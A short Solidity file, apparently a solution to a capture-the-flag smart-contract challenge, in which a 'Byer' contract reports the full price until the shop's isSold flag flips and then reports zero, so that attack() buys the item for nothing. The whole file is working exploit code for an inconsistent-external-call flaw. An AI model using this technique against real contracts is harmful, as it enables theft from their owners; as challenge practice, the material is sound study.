// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {  
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
    function buy() external;
}

contract Byer {
    address private target;  

    constructor(address _target) {
        target = _target;
    }

    function price() public view returns (uint256) {
        if (!IShop(target).isSold()) { 
            return IShop(target).price();
        }
        else {
            return 0;
        }
    }

    function attack() external {
        IShop(target).buy();
    }
}
